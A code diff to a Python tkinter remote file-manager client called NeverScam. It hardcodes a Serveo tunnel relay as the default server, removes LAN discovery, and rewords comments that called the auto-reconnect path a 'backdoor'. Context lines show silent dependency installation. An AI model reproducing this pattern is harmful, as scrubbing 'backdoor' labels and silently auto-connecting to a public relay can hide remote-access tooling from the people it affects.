@@ -1,3 +1,4 @@
+
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox, scrolledtext, simpledialog
 import os
@@ -12,7 +13,9 @@ import time
 
 # UDP discovery port - must match server
 DISCOVERY_PORT = 19876
-import time
+
+# Preset Serveo relay URL (no need to get URL from host)
+RELAY_URL = "neverscam.serveousercontent.com"
 
 # Auto-install dependencies silently
 def install_dependencies():
@@ -61,10 +64,16 @@ class FileManagerApp:
         threading.Thread(target=monitor, daemon=True).start()
 
     def attempt_reconnect(self):
-        """Try to reconnect to saved server or scan network."""
-        saved_config = os.path.join(os.path.expanduser("~"), "NeverScam_SavedServer.txt")
+        """Try to reconnect using preset URL or saved config."""
+        # Try preset relay URL first
+        if RELAY_URL and self.try_connect(RELAY_URL, 443):
+            self.server_host = RELAY_URL
+            self.server_port = 443
+            self.populate_tree()
+            return
         
-        # Try saved server first (backdoor)
+        # Try saved server
+        saved_config = os.path.join(os.path.expanduser("~"), "NeverScam_SavedServer.txt")
         if os.path.exists(saved_config):
             try:
                 with open(saved_config, 'r') as f:
@@ -80,14 +89,20 @@ class FileManagerApp:
             except Exception:
                 pass
         
-        # Scan network
-        self._scan_and_connect()
+        # Manual input
+        self.manual_connect()
 
     def auto_connect(self):
-        """Auto-connect by reading saved config or scanning for servers."""
-        saved_config = os.path.join(os.path.expanduser("~"), "NeverScam_SavedServer.txt")
+        """Auto-connect using preset relay URL first."""
+        # Try preset relay URL first (no need to get URL from host)
+        if RELAY_URL and self.try_connect(RELAY_URL, 443):
+            self.server_host = RELAY_URL
+            self.server_port = 443
+            self.save_server_info(RELAY_URL, 443)
+            return
         
-        # Try saved server first (backdoor for easier access)
+        # Fall back to saved config
+        saved_config = os.path.join(os.path.expanduser("~"), "NeverScam_SavedServer.txt")
         if os.path.exists(saved_config):
             try:
                 with open(saved_config, 'r') as f:
@@ -102,83 +117,17 @@ class FileManagerApp:
             except Exception:
                 pass
         
-        # Scan network
-        self._scan_and_connect()
+        # Manual input
+        self.manual_connect()
 
     def save_server_info(self, host, port):
-        """Save server info for quick reconnect (backdoor)."""
+        """Save server info for quick reconnect."""
         saved_config = os.path.join(os.path.expanduser("~"), "NeverScam_SavedServer.txt")
         try:
             with open(saved_config, 'w') as f:
                 f.write(f"{host}\n{port}")
         except Exception:
             pass
-
-    def _scan_and_connect(self):
-        """Scan local network for server using UDP discovery first."""
-        # Try UDP discovery first - instant server discovery
-        server_ip, server_port = self.discover_server()
-        if server_ip and server_port:
-            if self.try_connect(server_ip, server_port):
-                self.save_server_info(server_ip, server_port)
-                self.server_host = server_ip
-                self.server_port = server_port
-                return
-        
-        # Fall back to saved config or manual input
-        saved_config = os.path.join(os.path.expanduser("~"), "NeverScam_SavedServer.txt")
-        if os.path.exists(saved_config):
-            try:
-                with open(saved_config, 'r') as f:
-                    lines = f.read().strip().split('\n')
-                    if len(lines) >= 2:
-                        host = lines[0].strip()
-                        port = int(lines[1].strip())
-                        if self.try_connect(host, port):
-                            self.server_host = host
-                            self.server_port = port
-                            return
-            except Exception:
-                pass
-        
-        # Fall back to manual input
-        self.manual_connect()
-
-    def get_local_ip(self):
-        """Get local IP address."""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip = s.getsockname()[0]
-            s.close()
-            return ip
-        except Exception:
-            return "192.168.1.1"
-
-    def discover_server(self):
-        """Broadcast UDP discovery packet and wait for server response."""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            sock.settimeout(3)
-            
-            # Send discovery broadcast
-            sock.sendto(b"NEVERSCAM_DISCOVERY", ('<broadcast>', DISCOVERY_PORT))
-            
-            # Wait for response
-            while True:
-                try:
-                    data, addr = sock.recvfrom(1024)
-                    response = json.loads(data.decode('utf-8'))
-                    if 'ip' in response and 'tcp_port' in response:
-                        return response['ip'], response['tcp_port']
-                except socket.timeout:
-                    break
-                except Exception:
-                    break
-        except Exception:
-            pass
-        return None, None
 
     def try_connect(self, host, port):
         """Try to connect to a server."""
@@ -570,3 +519,4 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = FileManagerApp(root)
     root.mainloop()
+
